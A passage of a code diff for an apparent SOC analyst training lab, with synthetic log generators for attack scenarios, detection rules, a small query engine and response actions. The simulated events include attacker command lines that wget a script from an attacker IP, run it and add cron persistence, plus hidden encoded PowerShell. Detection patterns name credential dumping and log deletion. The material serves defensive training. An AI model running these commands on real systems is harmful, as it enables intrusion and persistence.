+  required:[['isolate_host',[p.host,p.ip]],['quarantine_email',[snd,snd.split('@')[1]]],['block_domain',dom]],recommended:[['reset_password',u]],
+  intel:{[dom]:'MALICIOUS — hosts PowerShell loaders.'},
+  story:`${u} opened <b>Salary_Revision_2026.docm</b> from ${snd}; the macro made Word start hidden PowerShell that downloaded a script from <b>${dom}</b>. Word should never start PowerShell.`,
+  tags:['T1566.001 Spearphishing Attachment','T1204.002 Malicious File','T1059.001 PowerShell'],hints:['sourcetype=edr parent=winword.exe']}}},
+
+/* ---------------- Network ---------------- */
+{id:'net_dnstun',cat:'Network',tag:'Network',type:'DNS tunneling',name:'DNS tunneling exfiltration',
+ desc:'Data is hidden in long random sub-domains of DNS queries to sneak it past the firewall.',
+ gen(c){const u=c.user(),p=PEOPLE[u],dom=pick(['t.dnsx-relay.example','q.cache-sync.example']),m=c.t(),n=rnd(120,180),E=[];
+  for(let i=0;i<n;i++)E.push(ev(m+i*.06,{sourcetype:'dns',host:p.host,src_ip:p.ip,query:hex(40)+'.'+dom,answer:'TXT'},1));
+  return{events:E,questions:[{q:'Which host is tunneling?',a:[p.host,p.ip]},{q:'Which base domain receives the data?',a:[dom]}],
+  required:[['isolate_host',[p.host,p.ip]],['block_domain',dom]],recommended:[['notify','*']],intel:{[dom]:'MALICIOUS — DNS tunneling (iodine/dnscat-like) server.'},
+  story:`<b>${p.host}</b> sent ${n} DNS queries with 40-character hex labels under <b>${dom}</b> — each query carries a chunk of data. Normal hosts query a dozen domains, not 150 unique names.`,
+  tags:['T1071.004 DNS','T1048 Exfiltration Over Alternative Protocol'],hints:['sourcetype=dns | stats dc(query) by host']}}},
+{id:'net_tor',cat:'Network',tag:'Network',type:'Tor usage (policy violation)',name:'Tor connections',
+ desc:'A workstation connects to the Tor network, hiding its traffic — against policy and common in malware.',
+ gen(c){const u=c.user(),p=PEOPLE[u],ips=[c.ip(),c.ip(),c.ip()],m=c.t(),E=[];E.push(ev(m,{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:'tor.exe',parent:'firefox.exe',cmdline:'C:\\Users\\'+u+'\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Tor\\tor.exe',hash:hex(64)},1));
+  for(let i=0;i<rnd(8,14);i++)E.push(ev(m+.2+i*2,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:p.ip,dest_ip:pick(ips),dest_port:9001,direction:'outbound',action:'allowed',bytes:rnd(5000,90000)},1));
+  const intel={};ips.forEach(i=>intel[i]='Tor relay (guard node).');
+  return{events:E,questions:[{q:'Which user is running Tor?',a:[u]}],required:[['block_ip',ips],['notify','*']],recommended:[['lookup_user',u],['isolate_host',[p.host,p.ip]]],intel,
+  story:`<b>${u}</b> runs Tor Browser on ${p.host} (connections to relays on port 9001). Policy violation at minimum — block the relays, inform the manager/HR, and check whether it hides something worse.`,tags:['T1090.003 Multi-hop Proxy'],hints:['sourcetype=firewall dest_port=9001']}}},
+
+/* ---------------- Email ---------------- */
+{id:'mail_bec',cat:'Email',tag:'Email',type:'Business email compromise (CEO fraud)',name:'CEO fraud wire request',
+ desc:'An email pretending to be the boss asks Finance for an urgent, secret bank transfer; replies go to an outside address.',
+ gen(c){const dom=pick(['company-ltd.example','cornpany.example']),snd='md@'+dom,rt='md.private.office@freemail.example',m=c.t(),E=[];
+  ['bob','farhan','tanvir'].forEach((u,i)=>E.push(ev(m+i*.02,{sourcetype:'email',sender:snd,display_name:'Managing Director',reply_to:rt,recipient:u+'@company.local',subject:'Urgent & confidential: wire 48,50,000 BDT today',verdict:'delivered'},1)));
+  return{events:E,questions:[{q:'Which look-alike domain sent it?',a:[dom]},{q:'Where do replies go? (reply-to)',a:[rt]}],
+  required:[['quarantine_email',[dom,snd]],['block_domain',dom],['notify','*']],recommended:[],intel:{[dom]:'SUSPICIOUS — look-alike of company.local, registered yesterday.'},
+  story:`<b>${snd}</b> (display name "Managing Director") asked Finance for an urgent secret transfer, with replies silently going to <b>${rt}</b>. No malware, no link — pure social engineering. Quarantine, block, and warn Finance immediately (Notify).`,
+  tags:['T1534 Internal Spearphishing (impersonation)','T1656 Impersonation'],hints:['sourcetype=email reply_to=* | table sender, reply_to, recipient, subject']}}}
+];
+
+const RULES2=[
+ {id:'W1',cat:'Web / OWASP',name:'SQL keywords in URL (SQLi)',sev:'high',q:'sourcetype=web uri=*select* | stats count by src_ip'},
+ {id:'W2',cat:'Web / OWASP',name:'Script tag in request (XSS)',sev:'high',q:'sourcetype=web uri=*<script* | stats count by src_ip'},
+ {id:'W3',cat:'Web / OWASP',name:'Path traversal attempt',sev:'medium',q:'sourcetype=web uri=*../* | stats count by src_ip'},
+ {id:'W4',cat:'Web / OWASP',name:'API object enumeration (IDOR)',sev:'high',q:'sourcetype=web uri=/api/orders/* | stats dc(uri) by user, src_ip | where dc > 20'},
+ {id:'W5',cat:'Web / OWASP',name:'Cloud metadata URL in request (SSRF)',sev:'high',q:'sourcetype=web uri=*169.254.169.254* | stats count by src_ip'},
+ {id:'W6',cat:'Web / OWASP',name:'404 flood (content discovery)',sev:'low',q:'sourcetype=web status=404 | stats count by src_ip | where count > 25'},
+ {id:'W7',cat:'Web / OWASP',name:'Sensitive dot-file served',sev:'high',q:'sourcetype=web uri=/.* status=200 | stats count by src_ip, uri'},
+ {id:'W8',cat:'Web / OWASP',name:'Package install script spawned curl',sev:'high',q:'sourcetype=edr parent=node process=curl | stats count by host'},
+ {id:'W9',cat:'Web / OWASP',name:'Credentials over plain HTTP',sev:'medium',q:'sourcetype=web scheme=http uri=*pass=* | stats count by host'},
+ {id:'W10',cat:'Web / OWASP',name:'One IP logged into many accounts',sev:'high',q:'sourcetype=web uri=/login status=200 | stats dc(user) by src_ip | where dc > 2'},
+ {id:'W11',cat:'Web / OWASP',name:'Coupon applied repeatedly',sev:'medium',q:'sourcetype=web uri=/api/cart/apply-coupon* | stats count by user | where count > 5'},
+ {id:'W12',cat:'Web / OWASP',name:'Login failures by one client (stuffing)',sev:'high',q:'sourcetype=web uri=/login status=401 | stats count by user_agent | where count > 30'},
+ {id:'W13',cat:'Web / OWASP',name:'Java web server spawned a shell',sev:'high',q:'sourcetype=edr parent=java process=sh | stats count by host'},
+ {id:'W14',cat:'Web / OWASP',name:'Log deletion / audit stopped',sev:'high',q:'sourcetype=edr cmdline=*/var/log/* | stats count by host'},
+ {id:'W15',cat:'Web / OWASP',name:'PHP process spawned commands (web shell)',sev:'high',q:'sourcetype=edr parent=php-fpm | stats count by host, process'},
+ {id:'W16',cat:'Web / OWASP',name:'Spike of HTTP 500 errors',sev:'medium',q:'sourcetype=web status=500 | stats count by src_ip | where count > 15'},
+ {id:'W17',cat:'Web / OWASP',name:'Admin area served to anonymous user',sev:'high',q:'sourcetype=web uri=/admin* status=200 user=- | stats count by src_ip'},
+ {id:'I1',cat:'Identity',name:'Password spray (many users, one source)',sev:'high',q:'sourcetype=auth action=failure | stats dc(user) by src_ip | where dc > 10'},
+ {id:'I2',cat:'Identity',name:'MFA push bombing',sev:'high',q:'sourcetype=auth event=mfa_push action=denied | stats count by user | where count > 5'},
+ {id:'I3',cat:'Identity',name:'Member added to Domain Admins',sev:'high',q:'sourcetype=auth event=group_member_added group="Domain Admins" | stats count by user, target_user'},
+ {id:'I4',cat:'Identity',name:'Kerberoasting (RC4 TGS burst)',sev:'high',q:'sourcetype=auth event=kerberos_tgs encryption=RC4 | stats dc(service) by user | where dc > 5'},
+ {id:'E1',cat:'Endpoint',name:'Shadow copy deletion',sev:'high',q:'sourcetype=edr cmdline=*delete*shadows* | stats count by host'},
+ {id:'E2',cat:'Endpoint',name:'Mass file rename (encryption)',sev:'high',q:'sourcetype=edr event=file_rename | stats count by host | where count > 50'},
+ {id:'E3',cat:'Endpoint',name:'LSASS memory access',sev:'high',q:'sourcetype=edr cmdline=*lsass* | stats count by host'},
+ {id:'E4',cat:'Endpoint',name:'PsExec on multiple hosts',sev:'medium',q:'sourcetype=edr process=PSEXESVC.exe | stats dc(host) by user | where dc > 1'},
+ {id:'E5',cat:'Endpoint',name:'Antivirus disabled',sev:'high',q:'sourcetype=edr cmdline=*DisableRealtimeMonitoring* | stats count by host'},
+ {id:'E6',cat:'Endpoint',name:'Mining pool connection (port 3333)',sev:'medium',q:'sourcetype=firewall dest_port=3333 | stats count by src_ip'},
+ {id:'E7',cat:'Endpoint',name:'Office app spawned a process',sev:'high',q:'sourcetype=edr parent=winword.exe | stats count by host, process'},
+ {id:'N1',cat:'Network',name:'DNS tunneling (many unique queries)',sev:'high',q:'sourcetype=dns | stats dc(query) by host | where dc > 50'},
+ {id:'N2',cat:'Network',name:'Tor relay connection (port 9001)',sev:'medium',q:'sourcetype=firewall dest_port=9001 | stats count by src_ip'},
+ {id:'M1',cat:'Email',name:'External reply-to address (BEC)',sev:'medium',q:'sourcetype=email reply_to=* | stats count by sender, reply_to'}];
+
+/* ============ story scenarios ============ */
+const SCENARIOS=[
+{id:'s1',name:'Midnight Knock',topic:'Brute force → server compromise',level:'Beginner',
+ brief:'The web team says SRV-WEB01 (the public web server) "feels slow" since this morning. Several detections fired around the same time. Find out what happened, contain it, and file your report.',
+ gen(){const atk=pick(['203.0.113.45','203.0.113.87','198.51.100.14']),vu=pick(['svc_backup','deploy','webadmin']),H='SRV-WEB01',HIP='10.0.2.10',E=[];
+  let m=rnd(20,35);const start=m,tries=rnd(60,90);
+  E.push(ev(start-.5,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:atk,dest_ip:HIP,dest_port:22,direction:'inbound',action:'allowed',bytes:rnd(50000,200000)},1));
+  for(let i=0;i<tries;i++){m+=R()*.2+.05;E.push(ev(m,{sourcetype:'auth',event:'ssh_login',host:H,user:pick(['root','admin','test','oracle','ubuntu',vu]),src_ip:atk,dest_ip:HIP,dest_port:22,action:'failure',country:'NL'},1))}
+  m+=.3;E.push(ev(m,{sourcetype:'auth',event:'ssh_login',host:H,user:vu,src_ip:atk,dest_ip:HIP,dest_port:22,action:'success',country:'NL'},1));
+  const xh=hex(64);
+  m+=2;E.push(ev(m,{sourcetype:'edr',event:'process_start',host:H,user:vu,process:'bash',parent:'sshd',cmdline:`wget http://${atk}/x.sh -O /tmp/.x.sh`,hash:xh},1));
+  m+=.5;E.push(ev(m,{sourcetype:'edr',event:'process_start',host:H,user:vu,process:'bash',parent:'sshd',cmdline:'chmod +x /tmp/.x.sh && /tmp/.x.sh',hash:xh},1));
+  m+=1;E.push(ev(m,{sourcetype:'edr',event:'process_start',host:H,user:vu,process:'crontab',parent:'bash',cmdline:'(crontab -l; echo "*/5 * * * * /tmp/.x.sh") | crontab -',hash:hex(64)},1));
+  for(let k=0;k<6;k++){m+=rnd(3,6);E.push(ev(m,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:HIP,dest_ip:atk,dest_port:4444,direction:'outbound',action:'allowed',bytes:rnd(4000,90000)},1))}
+  return{events:E,truth:{verdict:'TP',
+   questions:[{id:'ip',q:'Which external IP attacked the server?',a:[atk]},{id:'user',q:'Which account was compromised?',a:[vu]},{id:'host',q:'Which host was compromised?',a:[H,HIP]}],
+   required:[['block_ip',atk],['disable_user',vu],['isolate_host',[H,HIP]]],
+   recommended:[['enrich_ip',atk],['reset_password',vu]],forbidden:[],
+   intel:{[atk]:'MALICIOUS — risk 94/100. Reported 1,203 times for SSH brute force. Hosting provider with poor abuse handling.',[xh]:'MALICIOUS — 41/70 engines: Linux.Miner/Backdoor dropper'},
+   story:`${atk} hammered SSH on ${H} with ${tries} password guesses, then logged in as <b>${vu}</b> (a weak service-account password). The attacker downloaded a script with wget, ran it, added a cron job for persistence and opened outbound connections on port 4444 back to the attacker.`,
+   mitre:['T1110.001 Password Guessing','T1078 Valid Accounts','T1105 Ingress Tool Transfer','T1053.003 Scheduled Task: Cron','T1571 Non-Standard Port'],
+   hints:['Start with the "Brute-force authentication" alert, then search: sourcetype=auth src_ip="<attacker>"','After many failures, look for action=success from the same IP — which user?','Check what happened on the host after login: sourcetype=edr host=SRV-WEB01']}}}},
+{id:'s2',name:'Password Expiry',topic:'Phishing → account takeover',level:'Beginner',
+ brief:'A few staff forwarded a suspicious "password expiry" email to the SOC. Shortly after, an unusual login alert fired. Determine who fell for it and respond before the attacker does damage.',
+ gen(){const dom=pick(['micros0ft-support.com','office365-verify.net','secure-m1crosoft.com']),snd='it-helpdesk@'+dom,users=Object.keys(PEOPLE),victim=pick(['nusrat','farhan','sadia']),other=pick(users.filter(u=>u!==victim)),lip=pick(['198.51.100.77','203.0.113.150']),cc=pick(['RU','NG','VN']),E=[];
+  const m=rnd(25,35);const rcpt=[victim,other,...users.filter(u=>u!==victim&&u!==other).sort(()=>R()-.5).slice(0,4)];
+  rcpt.forEach((u,i)=>E.push(ev(m+i*.05,{sourcetype:'email',sender:snd,recipient:u+'@company.local',subject:'Action required: your password expires today',url:`http://${dom}/login`,verdict:'delivered'},1)));
+  const c=m+rnd(5,10);
+  E.push(ev(c,{sourcetype:'proxy',user:victim,src_ip:PEOPLE[victim].ip,domain:dom,url:`http://${dom}/login`,method:'GET',category:'newly_registered',action:'allowed',bytes:rnd(20000,60000)},1));
+  E.push(ev(c+.8,{sourcetype:'proxy',user:victim,src_ip:PEOPLE[victim].ip,domain:dom,url:`http://${dom}/login/submit`,method:'POST',category:'newly_registered',action:'allowed',bytes:rnd(800,2000)},1));
+  E.push(ev(c+rnd(3,8),{sourcetype:'proxy',user:other,src_ip:PEOPLE[other].ip,domain:dom,url:`http://${dom}/login`,method:'GET',category:'newly_registered',action:'blocked',bytes:0},1));
+  const l=c+rnd(15,25);
+  E.push(ev(l,{sourcetype:'auth',event:'o365_login',host:'AzureAD',user:victim,src_ip:lip,action:'success',country:cc},1));
+  E.push(ev(l+2,{sourcetype:'auth',event:'mailbox_rule_created',host:'Exchange',user:victim,src_ip:lip,action:'success',country:cc,msg:'Forward all incoming mail to external address'},1));
+  return{events:E,truth:{verdict:'TP',
+   questions:[{id:'dom',q:'What is the phishing sender domain?',a:[dom]},{id:'user',q:'Which user submitted their credentials?',a:[victim]},{id:'ip',q:'From which IP did the attacker log in?',a:[lip]}],
+   required:[['quarantine_email',[dom,snd]],['block_domain',dom],['reset_password',victim]],
+   recommended:[['enrich_ip',lip],['block_ip',lip],['disable_user',victim]],forbidden:[],
+   intel:{[dom]:'PHISHING — typosquat of microsoft.com, registered 2 days ago, hosts a fake Microsoft 365 login page.',[lip]:`SUSPICIOUS — VPS hosting (${cc}), seen in credential-stuffing reports.`,[snd]:'Sender domain fails SPF/DMARC; first seen today.'},
+   story:`A typosquatted domain <b>${dom}</b> sent a fake password-expiry email to ${rcpt.length} staff. <b>${victim}</b> opened the link and POSTed the login form (credentials stolen). ${other} also clicked, but the proxy blocked it. About 20 minutes later the attacker logged in to ${victim}'s mailbox from ${lip} (${cc}) and created a forwarding rule to steal mail.`,
+   mitre:['T1566.002 Spearphishing Link','T1056 Credential Capture (fake login)','T1078.004 Valid Cloud Accounts','T1114.003 Email Forwarding Rule'],
+   hints:['Look at the emails: sourcetype=email | stats count by sender, subject','Who visited the phishing domain? sourcetype=proxy domain="<domain>" — note method=POST','Then find logins for that user from outside Bangladesh: sourcetype=auth country!=BD']}}}},
+{id:'s3',name:'Quiet Heartbeat',topic:'Malware infection → C2 beaconing',level:'Intermediate',
+ brief:'EDR and DNS analytics flagged an endpoint. Nothing is visibly broken, but something keeps "phoning home" at a steady rhythm. Identify the infected machine, the malware and its command-and-control server.',
+ gen(){const u=pick(['karim','alice','tanvir']),p=PEOPLE[u],c2=pick(['upd4te-cdn.net','cdn-telemetry.org','static-assets-sync.com']),c2ip=pick(['198.51.100.23','203.0.113.66']),mh=hex(64),snd='billing@'+pick(['fast-invoices.example','acct-payable.example']),E=[];
+  const m=rnd(12,18);
+  E.push(ev(m,{sourcetype:'email',sender:snd,recipient:u+'@company.local',subject:'Invoice #'+rnd(10000,99999)+' overdue',attachment:'Invoice_Nov.zip',verdict:'delivered'},1));
+  const x=m+rnd(4,8);
+  E.push(ev(x,{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:'Invoice_Nov.pdf.exe',parent:'outlook.exe',cmdline:'C:\\Users\\'+u+'\\AppData\\Local\\Temp\\Invoice_Nov.pdf.exe',hash:mh},1));
+  E.push(ev(x+.4,{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:'powershell.exe',parent:'Invoice_Nov.pdf.exe',cmdline:'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',hash:'a1b2'+hex(60)},1));
+  E.push(ev(x+.6,{sourcetype:'edr',event:'registry_set',host:p.host,user:u,process:'powershell.exe',parent:'Invoice_Nov.pdf.exe',cmdline:'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater',hash:mh},1));
+  for(let t=x+1;t<120;t+=1+(R()-.5)*.08){E.push(ev(t,{sourcetype:'dns',host:p.host,src_ip:p.ip,query:c2,answer:c2ip},1));E.push(ev(t+.01,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:p.ip,dest_ip:c2ip,dest_port:443,direction:'outbound',action:'allowed',bytes:rnd(300,900)},1))}
+  return{events:E,truth:{verdict:'TP',
+   questions:[{id:'host',q:'Which host is infected?',a:[p.host,p.ip]},{id:'c2',q:'What is the C2 (command-and-control) domain?',a:[c2]},{id:'hash',q:'SHA-256 hash of the malicious executable (first 8+ characters OK)',a:[mh]}],
+   required:[['isolate_host',[p.host,p.ip]],['block_domain',c2],['check_hash',mh]],
+   recommended:[['block_ip',c2ip],['reset_password',u],['quarantine_email',[snd]]],forbidden:[],
+   intel:{[c2]:'MALICIOUS — C2 infrastructure for the (fictional) "NightOwl" loader. Registered 4 days ago.',[c2ip]:'MALICIOUS — hosts NightOwl C2 panel.',[mh]:'MALICIOUS — 58/70 engines: Trojan.Loader.NightOwl',[snd]:'Sender domain first seen today; no prior mail history.'},
+   story:`${u} received a fake overdue-invoice email with a zip attachment and ran <b>Invoice_Nov.pdf.exe</b> (double extension trick) on <b>${p.host}</b>. It spawned hidden, base64-encoded PowerShell, set a Run key for persistence, and began beaconing to <b>${c2}</b> (${c2ip}) roughly every 60 seconds — a classic C2 heartbeat.`,
+   mitre:['T1566.001 Spearphishing Attachment','T1204.002 User Execution: Malicious File','T1059.001 PowerShell','T1547.001 Registry Run Keys','T1071.004 C2 over DNS/Web (beaconing)'],
+   hints:['The "DNS beaconing" alert shows a host making ~60 queries/hour to one domain. Is it in the normal domain list?','Search EDR on that host: sourcetype=edr host="<host>" | table _time, process, parent, cmdline, hash','Use SOAR "Check file hash" on the suspicious exe before isolating.']}}}},
+{id:'s4',name:'Finance Leak',topic:'Insider data exfiltration',level:'Intermediate',
+ brief:'The DLP team noticed unusual outbound volume today. Finance data may be leaving the company. Work out who, what, where and how much — then stop it and loop in the right people.',
+ gen(){const u=pick(['bob','farhan','tanvir']),p=PEOPLE[u],dest=pick(['files.transfer-share.example','upload.anonbox.example']),dip=pick(['203.0.113.200','198.51.100.199']),bytes=rnd(2100,2800)*1e6,E=[];
+  const m=rnd(55,62);
+  E.push(ev(m-3,{sourcetype:'proxy',user:u,src_ip:p.ip,domain:dest,url:'https://'+dest+'/',method:'GET',category:'file-sharing',action:'allowed',bytes:rnd(30000,90000)},1));
+  E.push(ev(m-1,{sourcetype:'auth',event:'smb_logon',host:'SRV-FILE01',user:u,src_ip:p.ip,action:'success',country:'BD'},1));
+  const files=rnd(110,160);for(let i=0;i<files;i++)E.push(ev(m+i*.08,{sourcetype:'edr',event:'file_read',host:'SRV-FILE01',user:u,process:'explorer.exe',parent:'smb',cmdline:`\\\\SRV-FILE01\\Finance\\${pick(['Payroll','Budget','Vendors','Tax'])}\\${pick(['2025','2026'])}_${hex(4)}.xlsx`,hash:'-'},1));
+  const z=m+files*.08+2;
+  E.push(ev(z,{sourcetype:'edr',event:'process_start',host:p.host,user:u,process:'7z.exe',parent:'cmd.exe',cmdline:'7z.exe a -p C:\\Users\\'+u+'\\Desktop\\q4_backup.7z \\\\SRV-FILE01\\Finance\\',hash:hex(64)},1));
+  E.push(ev(z+4,{sourcetype:'proxy',user:u,src_ip:p.ip,domain:dest,url:'https://'+dest+'/upload',method:'POST',category:'file-sharing',action:'allowed',bytes},1));
+  E.push(ev(z+4.1,{sourcetype:'firewall',host:'FW-EDGE01',src_ip:p.ip,dest_ip:dip,dest_port:443,direction:'outbound',action:'allowed',bytes},1));
+  const gb=Math.round(bytes/1e8)/10;
+  return{events:E,truth:{verdict:'TP',
+   questions:[{id:'user',q:'Which user exfiltrated data?',a:[u]},{id:'dest',q:'To which domain was the data uploaded?',a:[dest]},{id:'gb',q:'Roughly how many GB were uploaded? (number)',num:gb,tol:.3}],
+   required:[['block_domain',dest],['disable_user',u],['notify','*']],
+   recommended:[['block_ip',dip],['isolate_host',[p.host,p.ip]],['lookup_user',u]],forbidden:[],
+   intel:{[dest]:'POLICY VIOLATION — anonymous file-sharing service, not approved by company policy.',[dip]:'Belongs to an anonymous file-sharing provider.'},
+   story:`<b>${u}</b> (${p.title}) browsed to an unapproved file-sharing site, opened SRV-FILE01 and read ${files} Finance files in ~${Math.round(files*.08)} minutes, packed them into a password-protected 7z archive and uploaded <b>${gb} GB</b> to <b>${dest}</b>. Insider cases also need HR/Legal involvement — that's why "notify" is part of the response.`,
+   mitre:['T1039 Data from Network Shared Drive','T1560.001 Archive via Utility','T1567.002 Exfiltration to Cloud Storage'],
+   hints:['Start with the "Large outbound upload" alert. Who and where?','Check what the same user touched before: sourcetype=edr user="<user>" | stats count by event, host','In real life, insider cases go to HR/Legal — SOAR has a Notify action.']}}}},
+{id:'s5',name:'Noisy Neighbor',topic:'False positive — authorised scan',level:'Tricky',
+ brief:'A port-scan alert fired from an INTERNAL address and the night-shift analyst wants to block it immediately. Before you act — is this actually an attack?',
+ gen(){const sip='10.0.1.250',tk='CHG-'+rnd(2000,2999),E=[];
+  E.push(ev(rnd(1,5),{sourcetype:'email',sender:'it-ops@company.local',recipient:'soc@company.local',subject:`${tk} approved: vulnerability scan 09:30–10:30 from IT-SCAN01 (${sip})`,verdict:'delivered'},0));
+  const targets=['10.0.2.5','10.0.2.10','10.0.2.20',...Object.values(PEOPLE).map(p=>p.ip)],ports=[21,22,23,25,53,80,110,135,139,143,389,443,445,636,1433,1521,3306,3389,5432,5900,5985,6379,8080,8443,9200,27017,111,161,514,2049];
+  targets.forEach((d,i)=>ports.forEach((pt,j)=>{if(R()<.85)E.push(ev(30+i*5+j*.15,{sourcetype:'firewall',host:'FW-CORE01',src_ip:sip,dest_ip:d,dest_port:pt,direction:'internal',action:R()<.6?'allowed':'blocked',bytes:rnd(60,400)}))}));
+  for(let i=0;i<8;i++)E.push(ev(35+i*6,{sourcetype:'auth',event:'windows_logon',host:'SRV-DC01',user:'svc_nessus',src_ip:sip,action:i%3?'success':'failure',country:'BD'}));
+  return{events:E,truth:{verdict:'FP',
+   questions:[{id:'ip',q:'Which IP is doing the scanning?',a:[sip]},{id:'tk',q:'Which change ticket authorises this activity?',a:[tk]}],
+   required:[['close_case','*']],recommended:[['enrich_ip',sip],['lookup_user','svc_nessus']],
+   forbidden:[['block_ip',sip],['isolate_host',['IT-SCAN01',sip]],['disable_user','svc_nessus']],
+   intel:{[sip]:'Internal asset IT-SCAN01 — vulnerability scanner owned by IT Security.'},
+   story:`The "port scan" came from <b>IT-SCAN01 (${sip})</b>, the company's own vulnerability scanner, during an approved window (<b>${tk}</b>, announced by email to the SOC). Blocking it would have broken security scanning — and blocking or isolating internal assets without checking can cause outages. Correct outcome: verify, document, close as false positive (and maybe tune the rule to exclude the scanner).`,
+   mitre:['T1046 Network Service Discovery (benign, authorised)'],
+   hints:['Who owns 10.0.1.250? Try SOAR "Enrich IP" — it is safe and read-only.','Check the mailbox: sourcetype=email | table _time, sender, subject','Good analysts verify before they block. Is there a change ticket?']}}}}
+];
+
+/* ============ detection rules ============ */
+const CORE_RULES=[
+ {id:'R1',name:'Brute-force authentication',sev:'high',q:'sourcetype=auth action=failure | stats count by src_ip | where count > 20'},
+ {id:'R2',name:'Login from unusual country',sev:'medium',q:'sourcetype=auth action=success country!=BD | stats count by user, src_ip'},
+ {id:'R3',name:'Access to newly registered domain',sev:'medium',q:'sourcetype=proxy category=newly_registered | stats count by user, domain'},
+ {id:'R4',name:'Executable launched by email client',sev:'high',q:'sourcetype=edr parent=outlook.exe | stats count by host, process'},
+ {id:'R5',name:'Encoded PowerShell',sev:'high',q:'sourcetype=edr process=powershell.exe cmdline=*-enc* | stats count by host'},
+ {id:'R6',name:'Possible DNS beaconing',sev:'high',q:'sourcetype=dns | stats count by host, query | where count > 40'},
+ {id:'R7',name:'Mass file access',sev:'medium',q:'sourcetype=edr event=file_read | stats count by user | where count > 50'},
+ {id:'R8',name:'Large outbound upload',sev:'high',q:'sourcetype=proxy bytes>500000000 | stats sum(bytes) by user, domain'},
+ {id:'R9',name:'Port scan detected',sev:'medium',q:'sourcetype=firewall | stats dc(dest_port) by src_ip | where dc > 20'}];
+CORE_RULES.forEach(r=>r.cat='Core');
+const DEFAULT_RULES=CORE_RULES.concat(RULES2);
+
+/* ============ query engine (mini SPL) ============ */
+function wild(v){return new RegExp('^'+v.replace(/[.+?^${}()|[\]\\]/g,'\\$&').replace(/\*/g,'.*')+'$','i')}
+function cmp(a,op,b){const na=Number(a),nb=Number(b),num=!isNaN(na)&&!isNaN(nb)&&a!==''&&a!=null;
+ switch(op){case '=':return a!=null&&wild(String(b)).test(String(a));case '!=':return a==null||!wild(String(b)).test(String(a));
+ case '>':return num&&na>nb;case '<':return num&&na<nb;case '>=':return num&&na>=nb;case '<=':return num&&na<=nb}return false}
+function parseFilters(s){const toks=s.match(/[^\s"]*"[^"]*"|\S+/g)||[];const out=[];let neg=false;
+ for(let t of toks){if(/^AND$/i.test(t))continue;if(/^OR$/i.test(t))throw new Error('OR is not supported in this lab — run two searches, or use wildcards like field=a*');
+  if(/^NOT$/i.test(t)){neg=true;continue}
+  const m=t.match(/^([\w.]+)(!=|>=|<=|=|>|<)(.*)$/);let c;
+  if(m)c={f:m[1],op:m[2],v:m[3].replace(/^"|"$/g,'')};else c={text:t.replace(/^"|"$/g,'').replace(/\*/g,'').toLowerCase()};
+  c.neg=neg;neg=false;out.push(c)}return out}
+function evMatch(e,c){let r;if(c.f)r=cmp(e[c.f],c.op,c.v);else if(!c.text)r=true;else r=Object.keys(e).some(k=>k[0]!=='_'&&String(e[k]).toLowerCase().includes(c.text));return c.neg?!r:r}
+function runQuery(q,events){const parts=q.split('|').map(s=>s.trim());const conds=parseFilters(parts[0]);
+ let res={kind:'events',rows:events.filter(e=>conds.every(c=>evMatch(e,c))).sort((a,b)=>b._time-a._time)};
+ for(const cmd of parts.slice(1)){if(!cmd)continue;let m;
+  if(m=cmd.match(/^stats\s+(count|dc\((\w+)\)|sum\((\w+)\)|avg\((\w+)\))(?:\s+by\s+(.+))?$/i)){
+   const agg=m[1].toLowerCase().startsWith('count')?'count':m[1].slice(0,m[1].indexOf('(')).toLowerCase(),af=m[2]||m[3]||m[4],by=m[5]?m[5].split(/[\s,]+/).filter(Boolean):[];
+   const g=new Map();for(const e of res.rows){const k=by.map(f=>e[f]??'(null)').join('\u0001');if(!g.has(k))g.set(k,[]);g.get(k).push(e)}
+   const rows=[];for(const[k,evs]of g){const r={};by.forEach((f,i)=>r[f]=k.split('\u0001')[i]);
+    if(agg==='count')r.count=evs.length;else if(agg==='dc')r.dc=new Set(evs.map(e=>e[af]).filter(v=>v!=null)).size;
+    else{const s=evs.reduce((a,e)=>a+(Number(e[af])||0),0);r[agg]=agg==='avg'?Math.round(s/evs.length):s}
+    r._events=evs;rows.push(r)}
+   const col=agg;rows.sort((a,b)=>b[col]-a[col]);res={kind:'table',rows,cols:[...by,col],label:{[col]:m[1]}}}
+  else if(m=cmd.match(/^where\s+(\w+)\s*(>=|<=|!=|=|>|<)\s*(\S+)$/i))res.rows=res.rows.filter(r=>cmp(r[m[1]],m[2],m[3]));
+  else if(m=cmd.match(/^sort\s+(-?)(\w+)$/i)){const d=m[1]?-1:1,f=m[2];res.rows=[...res.rows].sort((a,b)=>{const x=a[f],y=b[f];return(typeof x==='number'&&typeof y==='number'?x-y:String(x??'').localeCompare(String(y??'')))*d})}
+  else if(m=cmd.match(/^head\s+(\d+)$/i))res.rows=res.rows.slice(0,+m[1]);
+  else if(m=cmd.match(/^table\s+(.+)$/i))res={kind:'table',rows:res.rows,cols:m[1].split(/[\s,]+/).filter(Boolean),label:res.label};
+  else throw new Error('Unknown command: "'+cmd+'". Supported: stats, where, sort, head, table');}
+ return res}
+
+/* ============ SOAR actions ============ */
+const ACTIONS={
+ enrich_ip:{label:'Enrich IP (threat intel)',ph:'IP address',cat:'Investigate'},
+ check_hash:{label:'Check file hash',ph:'SHA-256 hash',cat:'Investigate'},
+ lookup_user:{label:'Look up user (directory)',ph:'username',cat:'Investigate'},
+ block_ip:{label:'Block IP on firewall',ph:'IP address',cat:'Contain'},
+ block_domain:{label:'Block domain (proxy + DNS)',ph:'domain',cat:'Contain'},
+ isolate_host:{label:'Isolate host (EDR)',ph:'hostname or IP',cat:'Contain'},
+ disable_user:{label:'Disable user account',ph:'username',cat:'Contain'},
+ reset_password:{label:'Force password reset',ph:'username',cat:'Remediate'},
+ revoke_sessions:{label:'Revoke sessions / tokens',ph:'username or account',cat:'Contain'},
+ quarantine_email:{label:'Quarantine emails from sender',ph:'sender address or domain',cat:'Remediate'},
+ restore_backup:{label:'Restore from clean backup',ph:'hostname',cat:'Remediate'},
+ create_ticket:{label:'Create fix ticket (Dev / IT)',ph:'team: what to fix, e.g. Dev: parameterise SQL',cat:'Remediate'},
